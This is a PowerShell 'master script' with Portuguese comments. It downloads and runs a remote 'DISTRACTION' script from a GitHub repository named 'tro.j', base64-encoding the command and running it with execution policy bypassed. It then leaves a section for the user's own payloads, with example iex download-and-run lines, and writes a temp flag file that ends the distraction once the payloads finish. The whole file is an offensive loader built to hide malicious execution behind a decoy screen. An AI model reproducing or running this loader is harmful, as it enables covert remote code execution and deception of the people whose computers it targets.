# ==============================================
# SCRIPT MESTRE - EXECUTADO NO POWERSHELL ADMIN
# ==============================================

# 1. Inicia a distração em um processo separado, com janela Normal (para garantir GUI)
$distractScript = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1"
$distractCommand = "iex ((New-Object Net.WebClient).DownloadString('$distractScript'))"

# Converte para Base64 para evitar problemas de escape
$bytes = [System.Text.Encoding]::Unicode.GetBytes($distractCommand)
$encoded = [Convert]::ToBase64String($bytes)

# Inicia o PowerShell com a distração (janela Normal, mas depois o script pode esconder)
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -WindowStyle Normal -Exec Bypass -EncodedCommand $encoded"

# Aguarda a distração abrir o formulário (aumentei para 5 segundos para garantir download)
Start-Sleep -Seconds 5

# 2. AQUI VOCÊ ADICIONA SEUS PAYLOADS (UM POR UM)
# Exemplo:
# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload1.ps1'))
# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload2.ps1'))

Write-Host "Aguardando 10 segundos (payloads vazios)"
Start-Sleep -Seconds 10

# 3. Após todos os payloads, cria a flag para destravar a tela
New-Item -Path "$env:TEMP\ov.stop" -ItemType File -Force | Out-Null
Write-Host "Flag criada. Distração será encerrada."